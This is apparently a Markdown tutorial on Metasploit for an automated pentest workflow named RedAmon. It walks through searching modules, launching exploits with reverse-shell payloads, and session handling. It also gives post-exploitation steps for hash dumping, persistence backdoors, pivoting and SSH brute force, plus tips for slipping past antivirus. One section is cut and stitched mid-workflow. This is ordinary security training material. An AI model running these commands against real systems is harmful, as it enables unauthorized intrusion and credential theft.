## What is Metasploit?

Metasploit Framework is the world's most widely used penetration testing tool. Think of it as a "Swiss Army knife" for security testing - it contains thousands of ready-to-use exploits, payloads, and auxiliary tools.

### Key Concepts

| Term | Simple Explanation |
|------|-------------------|
| **Exploit** | Code that takes advantage of a vulnerability to gain access to a system |
| **Payload** | Code that runs on the target after successful exploitation (like opening a shell) |
| **Auxiliary** | Helper tools for scanning, fingerprinting, or fuzzing (not exploitation) |
| **Post** | Tools to use after you already have access (post-exploitation) |
| **Session** | An active connection to a compromised system |
| **Meterpreter** | An advanced payload that gives you a powerful interactive shell |
| **RHOSTS** | Remote hosts - the target IP address(es) |
| **LHOST** | Local host - your attacking machine's IP |
| **RPORT** | Remote port - the port on the target |
| **LPORT** | Local port - the port on your machine for reverse connections |

---

## When to Use Metasploit (in RedAmon Workflow)

In the RedAmon security assessment pipeline, Metasploit comes **AFTER** reconnaissance:

```
RECON PHASE (what you've already done):
WHOIS -> DNS -> Port Scan (Naabu) -> HTTP Probe -> Web Crawling -> Vulnerability Scan (Nuclei)
                                                                       |
                                                              Vulnerabilities Found!
                                                                       |
                                                                       v
EXPLOITATION PHASE (Metasploit):
Search Module -> Get Info -> Select Payload -> Configure -> Exploit -> Post-Exploitation
```

**Use Metasploit when:**
- Nuclei or GVM found a vulnerability with a CVE number
- You need to verify if a vulnerability is actually exploitable
- You need to demonstrate impact (proof of concept)
- You're doing authorized penetration testing

**Don't use Metasploit for:**
- Initial reconnaissance (use the recon tools instead)
- Port scanning (use Naabu - it's faster)
- Vulnerability scanning (use Nuclei - it's better for web)

---

## Getting Started

### Starting Metasploit Console

```bash
# Interactive mode (recommended for learning)
msfconsole

# Quiet mode (suppress banner)
msfconsole -q

# Execute a command and exit
msfconsole -q -x "search apache; exit"
```

### In Docker (RedAmon Setup)

```bash
# Enter interactive Metasploit console
docker exec -it redamon-kali msfconsole

# Run a single command
docker exec redamon-kali msfconsole -q -x "search type:exploit apache; exit"
```

### Basic Navigation

Once inside `msfconsole`:

```
msf6 > help                    # Show all commands
msf6 > search apache           # Search for modules
msf6 > use exploit/multi/http/apache_normalize_path  # Select a module
msf6 exploit(apache_normalize_path) > show options   # See what you need to configure
msf6 exploit(apache_normalize_path) > set RHOSTS www.devergolabs.com  # Set target
msf6 exploit(apache_normalize_path) > set LHOST eth0  # Set your IP (use interface name for auto-detect)
msf6 exploit(apache_normalize_path) > exploit        # Run the exploit
```

## Understanding Modules

Metasploit organizes everything into modules. There are 5 types:

### 1. Exploits (`exploit/`)

These are the actual attack code. They exploit vulnerabilities to gain access.

**Structure:** `exploit/<platform>/<service>/<name>`

Examples:
- `exploit/windows/smb/ms17_010_eternalblue` - Famous Windows SMB exploit
- `exploit/linux/http/apache_normalize_path_rce` - Apache path traversal RCE
- `exploit/multi/http/struts2_content_type_ognl` - Apache Struts RCE

### 2. Auxiliary (`auxiliary/`)

Helper tools that don't directly exploit - they scan, fingerprint, or brute force.

**Structure:** `auxiliary/<category>/<name>`

Examples:
- `auxiliary/scanner/http/http_version` - Get HTTP server version
- `auxiliary/scanner/portscan/tcp` - TCP port scanner
- `auxiliary/scanner/ssh/ssh_login` - SSH brute force

### 3. Payloads (`payload/`)

Code that runs after successful exploitation. Three sub-types:

| Type | Description |
|------|-------------|
| **Singles** | Self-contained, small payloads (like `exec` to run a command) |
| **Stagers** | Small code that downloads the larger stage |
| **Stages** | The actual payload downloaded by the stager (like Meterpreter) |

Examples:
- `linux/x64/shell_reverse_tcp` - Simple reverse shell
- `linux/x64/meterpreter/reverse_tcp` - Meterpreter (staged)
- `windows/x64/meterpreter/reverse_https` - Encrypted Meterpreter

### 4. Post (`post/`)

Tools for after you have a session. Gather info, escalate privileges, pivot.

Examples:
- `post/multi/gather/hashdump` - Dump password hashes
- `post/linux/gather/enum_system` - Enumerate Linux system
- `post/windows/gather/credentials/credential_collector` - Collect Windows creds

### 5. Encoders (`encoder/`)

Obfuscate payloads to avoid detection.

Examples:
- `encoder/x86/shikata_ga_nai` - Polymorphic encoder
- `encoder/x64/xor` - Simple XOR encoding

---

## Metasploit Operations Reference

This section covers the core operations available in Metasploit Framework.

### Searching for Modules

**Purpose:** Find modules in the Metasploit database.

Metasploit contains 4,000+ modules. Use search to find exploits, auxiliaries, or payloads matching your query.

#### Search Syntax

**Basic keyword search:**
```
apache struts          # Find anything with "apache" AND "struts"
wordpress              # Find anything related to WordPress
CVE-2021-41773         # Search by CVE number
ms17-010               # Search by MS bulletin number
```

**Filter by type:**
```
type:exploit apache         # Only exploits for Apache
type:auxiliary scanner      # Only auxiliary scanners
type:post linux            # Only post-exploitation for Linux
type:payload meterpreter   # Only Meterpreter payloads
```

**Filter by platform:**
```
platform:windows smb       # Windows SMB modules
platform:linux http        # Linux HTTP modules
platform:multi apache      # Cross-platform Apache modules
```

**Filter by rank (reliability):**
```
rank:excellent            # Only excellent-rated exploits
rank:great               # Great-rated exploits
rank:good                # Good-rated exploits
```

Ranks from best to worst: `excellent` > `great` > `good` > `normal` > `average` > `low` > `manual`

**Combined filters:**
```
type:exploit platform:linux rank:excellent http
```

#### Examples

```bash
# Find exploits for a CVE found by Nuclei
search CVE-2021-41773

# Find HTTP scanners
search type:auxiliary scanner http

# Find WordPress exploits
search type:exploit wordpress

# Find excellent-ranked Windows exploits
search type:exploit platform:windows rank:excellent
```

#### Understanding the Output

```
Matching Modules

   1  auxiliary/scanner/http/apache_normalize_path  2021-10-07       normal     No     Apache 2.4.49/2.4.50 Path Traversal
```

| Column | Meaning |
|--------|---------|
| # | Index number |
| Name | Full module path (use this with the `info` command) |
| Disclosure Date | When the vulnerability was publicly disclosed |
| Rank | Reliability rating |
| Check | Whether the module can check without exploiting (safe test) |
| Description | What the module does |

---

### Getting Module Information

**Purpose:** Get detailed information about a specific module.

Use the `info` command to see everything about a module: what it exploits, what options you need to set, what targets it supports, references, and authors.

#### Examples

```bash
# Get info on Apache path traversal exploit
info exploit/multi/http/apache_normalize_path_rce

# Get info on EternalBlue
info exploit/windows/smb/ms17_010_eternalblue

# Get info on an auxiliary scanner
info auxiliary/scanner/http/http_version

# Or first select the module, then use info
use exploit/multi/http/apache_normalize_path_rce
info
```

#### Understanding the Output

```
       Name: Apache 2.4.49/2.4.50 Path Traversal RCE

### Working with Payloads

**Purpose:** List all payloads compatible with an exploit.

Use `show payloads` to see which payloads work with a specific exploit module. Different exploits support different payload types based on target OS and architecture.

#### Examples

```bash
# First select an exploit module
use exploit/multi/http/apache_normalize_path_rce

# Then see what payloads work with it
show payloads

# For Windows exploits
use exploit/windows/smb/ms17_010_eternalblue
show payloads
```

#### Understanding the Output

```
Compatible Payloads
===================

   #  Name                                     Disclosure Date  Rank    Check  Description
   -  ----                                     ---------------  ----    -----  -----------
   0  payload/cmd/unix/reverse_bash                             normal  No     Unix Command Shell, Reverse TCP (/dev/tcp)
   1  payload/cmd/unix/reverse_netcat                           normal  No     Unix Command Shell, Reverse TCP (via netcat)
   2  payload/linux/x64/meterpreter/reverse_tcp                 normal  No     Linux Meterpreter, Reverse TCP Stager
   3  payload/linux/x64/shell/reverse_tcp                       normal  No     Linux Command Shell, Reverse TCP Stager
```

**Choosing the right payload:**

| Payload Type | When to Use |
|--------------|-------------|
| `cmd/unix/*` | Simple, works on most Unix systems |
| `linux/x64/shell/*` | Need a basic shell on 64-bit Linux |
| `linux/x64/meterpreter/*` | Need advanced features (file download, pivoting) |
| `windows/x64/meterpreter/*` | Windows target, need advanced features |
| `*_reverse_tcp` | Target can connect back to you (most common) |
| `*_bind_tcp` | You connect to target (use when target can't reach you) |
| `*_reverse_https` | Encrypted connection, harder to detect |

#### Payload Information

**Purpose:** Get detailed information about a specific payload.

Use the `info` command on a payload to see its description, required options (LHOST, LPORT), platform compatibility, and architecture requirements.

#### Examples

```bash
# Get info on Linux Meterpreter
info payload/linux/x64/meterpreter/reverse_tcp

# Get info on Windows reverse shell
info payload/windows/x64/shell_reverse_tcp

# Get info on simple bash reverse shell
info payload/cmd/unix/reverse_bash

# Or set the payload first, then use info
set PAYLOAD linux/x64/meterpreter/reverse_tcp
info
```

#### Understanding the Output

```
       Name: Linux Meterpreter, Reverse TCP Stager
     Module: payload/linux/x64/meterpreter/reverse_tcp
   Platform: Linux
       Arch: x64
   Needs Admin: No
 Total size: 130

Basic options:
  Name   Current Setting  Required  Description
  ----   ---------------  --------  -----------
  LHOST                   yes       The listen address (your IP)
  LPORT  4444             yes       The listen port

Description:
  Spawn a Meterpreter shell and connect back to the attacker.
  Uses a staged approach - small stager downloads full Meterpreter.
```

**Key options explained:**

| Option | What it means |
|--------|---------------|
| LHOST | **Your** IP address - where the target connects back to |
| LPORT | Port on your machine that listens for the connection |
| Platform | Target must be running this OS |
| Arch | Target must have this CPU architecture |
| Staged vs Stageless | Staged = smaller, downloads full payload. Stageless = larger, self-contained |

---

### Running Exploits

**Purpose:** Execute an exploit with a payload against a target.

Configure the module options and launch the exploitation attempt. If successful, it creates a session (shell access) to the target.

#### Required Configuration

| Option | Description |
|--------|-------------|
| `RHOSTS` | Target IP address or hostname |
| `RPORT` | Target port number |
| `PAYLOAD` | Payload to deliver |
| `LHOST` | Your IP address (for reverse connection) |
| `LPORT` | Your listening port |

#### Examples

```bash
# Basic exploitation workflow
use exploit/multi/http/apache_normalize_path_rce
set RHOSTS 10.0.0.5
set RPORT 443
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 10.0.0.10
set LPORT 4444
exploit

# With extra options
use exploit/multi/http/apache_normalize_path_rce
set RHOSTS 10.0.0.5
set RPORT 8080
set PAYLOAD cmd/unix/reverse_bash
set LHOST 10.0.0.10
set LPORT 4444
set SSL false
set TARGETURI /cgi-bin
exploit
```

#### Understanding the Output

**Successful exploitation:**
```
[*] Started reverse TCP handler on 10.0.0.10:4444
[*] 10.0.0.5:443 - Attempting to exploit...
[*] 10.0.0.5:443 - Sending payload...
[*] Sending stage (3012548 bytes) to 10.0.0.5
[*] Meterpreter session 1 opened (10.0.0.10:4444 -> 10.0.0.5:49832)

Active sessions
===============

  Id  Type                   Information          Connection
  --  ----                   -----------          ----------
  1   meterpreter x64/linux  www-data @ target    10.0.0.10:4444 -> 10.0.0.5:49832
```

**Failed exploitation:**
```
[*] Started reverse TCP handler on 10.0.0.10:4444
[*] 10.0.0.5:443 - Attempting to exploit...
[-] 10.0.0.5:443 - Exploit failed: The target is not vulnerable
[*] Exploit completed, but no session was created.
```

**Common failure reasons:**

| Message | Meaning |
|---------|---------|
| "Target is not vulnerable" | The target was patched or different version |
| "Connection refused" | Target port is closed or firewalled |
| "No session created" | Payload didn't execute (firewall, AV, wrong payload) |
| "Handler failed to bind" | Your LPORT is already in use |

---

### Managing Sessions

**Purpose:** List all active sessions (compromised systems).

Use the `sessions` command to see all current connections to compromised targets, including session type, user context, and connection details.

#### Examples

```bash
# List all active sessions
sessions

# List with details
sessions -l

# Interact with a specific session
sessions -i 1

# Kill a specific session
sessions -k 1

# Kill all sessions
sessions -K
```

#### Understanding the Output

```
Active sessions
===============

  Id  Name  Type                   Information               Connection
  --  ----  ----                   -----------               ----------
  1         meterpreter x64/linux  www-data @ webserver      10.0.0.10:4444 -> 10.0.0.5:49832 (10.0.0.5)
  2         shell linux            command shell             10.0.0.10:4445 -> 10.0.0.6:52341 (10.0.0.6)
```

| Column | Meaning |
|--------|---------|
| Id | Session number - use this with `sessions -i <id>` |
| Type | `meterpreter` (advanced) or `shell` (basic) |
| Information | Username @ hostname |
| Connection | Your_IP:port -> Target_IP:port |

---

### Session Interaction

**Purpose:** Execute commands on a compromised system.

Use `sessions -i <id>` to interact with an active session. Different commands work depending on whether it's a shell or meterpreter session.

#### How to Interact

```bash
# Enter an interactive session
sessions -i 1

# You're now inside the session
# Use 'background' to return to msfconsole
# Use Ctrl+Z as alternative to background

# From within meterpreter, run shell commands
meterpreter > shell
# Or execute directly
meterpreter > execute -f cmd.exe -i -H
```

#### Shell Session Commands

For basic shell sessions (type: `shell`), use standard Linux/Windows commands:

```bash
# Linux shell commands
whoami              # Current user
id                  # User ID and groups
uname -a            # System info
cat /etc/passwd     # User accounts
cat /etc/shadow     # Password hashes (needs root)
netstat -tlnp       # Network connections
ps aux              # Running processes
ls -la /home        # List home directories
cat /etc/crontab    # Scheduled tasks
find / -perm -4000 2>/dev/null  # SUID binaries

# Windows shell commands
whoami /all                        # Current user with privileges
systeminfo                         # System information
net user                           # User accounts
net localgroup administrators      # Admin users
ipconfig /all                      # Network configuration
tasklist                           # Running processes
netstat -ano                       # Network connections
```

#### Meterpreter Commands

For meterpreter sessions (type: `meterpreter`), use meterpreter-specific commands:

```bash
# System information
sysinfo          # Detailed system info
getuid           # Current user
getpid           # Current process ID
ps               # Process list

# File operations
pwd              # Current directory
ls               # List files
cat /etc/passwd  # Read file
download /etc/passwd /opt/output/  # Download file
upload /opt/tools/linpeas.sh /tmp/ # Upload file

# Privilege escalation
getsystem        # Attempt to get SYSTEM (Windows)
hashdump         # Dump password hashes

# Network
ipconfig         # Network interfaces
route            # Routing table
arp              # ARP table
portfwd add -l 8080 -p 80 -r 192.168.1.100  # Port forward

# Shell access
shell            # Drop to system shell
execute -f cmd.exe -i -H  # Execute hidden command
```

#### Example Session Output

```
meterpreter > sysinfo

Computer        : webserver
OS              : Ubuntu 20.04 (Linux 5.4.0-42-generic)
Architecture    : x64
Meterpreter     : x64/linux
```

msfconsole -q -x "info exploit/multi/http/apache_normalize_path_rce; exit"

# 3. Check compatible payloads
msfconsole -q -x "use exploit/multi/http/apache_normalize_path_rce; show payloads; exit"

# 4. Exploit
msfconsole -q -x "
use exploit/multi/http/apache_normalize_path_rce
set RHOSTS 10.0.0.5
set RPORT 443
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 10.0.0.10
set LPORT 4444
exploit
"
```

### Workflow 2: Check Before Exploit (Safe Mode)

Some modules can check if vulnerable without actually exploiting:

```bash
msfconsole -q -x "
use exploit/multi/http/apache_normalize_path_rce
set RHOSTS 10.0.0.5
set RPORT 443
check
exit
"
```

Output:
```
[+] 10.0.0.5:443 - The target is vulnerable.
```
or
```
[-] 10.0.0.5:443 - The target is not vulnerable.
```

### Workflow 3: Using Auxiliary Scanners

When you don't have a specific CVE but want to identify service versions:

```bash
# HTTP version scanner
msfconsole -q -x "
use auxiliary/scanner/http/http_version
set RHOSTS 10.0.0.5
set RPORT 80
run
exit
"

# FTP scanner
msfconsole -q -x "
use auxiliary/scanner/ftp/ftp_version
set RHOSTS 10.0.0.5
run
exit
"

# SMB scanner
msfconsole -q -x "
use auxiliary/scanner/smb/smb_version
set RHOSTS 10.0.0.5
run
exit
"
```

### Workflow 4: Brute Force (THC Hydra — preferred)

> **Note:** RedAmon now uses THC Hydra (`execute_hydra`) for brute force attacks instead of Metasploit auxiliary modules. Hydra is faster, stateless, and supports 50+ protocols.

```bash
# SSH brute force with Hydra (via execute_hydra MCP tool)
hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt -t 4 -f -e nsr -V ssh://10.0.0.5

# After credentials found, establish access:
sshpass -p 'discovered_password' ssh -o StrictHostKeyChecking=no admin@10.0.0.5 'whoami && id'
```

**Warning:** Brute forcing can lock accounts and trigger alerts!

## Post-Exploitation

After getting a session, here's what to do:

### Initial Enumeration

```bash
# In meterpreter session
sysinfo                    # System information
getuid                     # Current user
getprivs                   # Current privileges
```

### Privilege Escalation

```bash
# Try automatic privilege escalation (Windows)
getsystem

# Search for privesc opportunities
run post/multi/recon/local_exploit_suggester
```

### Gather Credentials

```bash
# Dump password hashes
hashdump                   # Linux/Windows
run post/linux/gather/hashdump
run post/windows/gather/hashdump

# Search for credentials in files
run post/multi/gather/credentials/credential_collector
```

### Persistence (maintain access)

```bash
# Create persistent backdoor
run persistence -U -i 60 -p 4444 -r 10.0.0.10
```

### Pivoting (attack internal networks)

```bash
# Add route through compromised host
run autoroute -s 192.168.1.0/24

# Set up SOCKS proxy
use auxiliary/server/socks_proxy
set SRVPORT 1080
run -j

# Then use proxychains on attacker machine:
# proxychains nmap 192.168.1.100
```

## Safety and Legal Considerations

### ALWAYS Remember

1. **Get Written Authorization** - Never test systems without explicit permission
2. **Define Scope** - Know exactly what systems you're allowed to test
3. **Document Everything** - Keep logs of all actions
4. **Know Your Exit** - Have a plan to clean up after testing
5. **Don't Cause Damage** - Avoid DoS, data destruction, or production impact

### In RedAmon Context

- Use `--dry-run` options when available
- Prefer `check` before `exploit`
- Test on isolated/staging systems first
- Use the Neo4j graph to track what you've tested

### Clean Up After Testing

```bash
# List all sessions
sessions -l

# Kill all sessions
sessions -K

# Check for leftover jobs
jobs -l

# Kill all jobs
jobs -K

# Exit cleanly
exit
```

## Quick Reference Card

### Most Used Commands

```bash
# Search
search <keyword>
search type:exploit <keyword>
search CVE-XXXX-XXXXX

# Select module
use <module_path>

# Configure
set RHOSTS <target_ip>
set RPORT <target_port>
set PAYLOAD <payload_path>
set LHOST <your_ip>
set LPORT <your_port>

# Execute
check          # Safe check
exploit        # Run exploit
exploit -j     # Run in background

# Sessions
sessions -l    # List
sessions -i 1  # Interact
sessions -k 1  # Kill
```

### Common Payloads

| Target | Payload |
|--------|---------|
| Linux (simple) | `cmd/unix/reverse_bash` |
| Linux (advanced) | `linux/x64/meterpreter/reverse_tcp` |
| Windows (simple) | `windows/x64/shell_reverse_tcp` |
| Windows (advanced) | `windows/x64/meterpreter/reverse_tcp` |
| Java apps | `java/meterpreter/reverse_tcp` |
| PHP apps | `php/meterpreter/reverse_tcp` |

### Common Ports for LPORT

| Port | Notes |
|------|-------|
| 4444 | Default (may be blocked) |
| 443 | Looks like HTTPS (recommended) |
| 80 | Looks like HTTP |
| 8080 | Alternative HTTP |
| 53 | Looks like DNS |

## Troubleshooting

### "No session was created"

1. **Check firewall** - Can target reach your LHOST:LPORT?
2. **Try different payload** - `cmd/unix/reverse_bash` is simpler than meterpreter
3. **Try different LPORT** - Use 443 or 80 (often allowed through firewalls)
4. **Verify target is vulnerable** - Use `check` command first

### "Connection refused"

1. **Verify target port is open** - Use Naabu or nmap first
2. **Check if service is running** - The service might have crashed
3. **Try different RPORT** - Maybe it's on a non-standard port

### "Handler failed to bind"

1. **Port already in use** - Choose a different LPORT
2. **Need root** - Ports below 1024 require root privileges
3. **Firewall blocking** - Check your local firewall

### Meterpreter dies immediately

1. **AV/EDR killed it** - Try `shikata_ga_nai` encoder
2. **Wrong architecture** - Match payload to target (x86 vs x64)
3. **Try stageless payload** - `shell_reverse_tcp` instead of `shell/reverse_tcp`
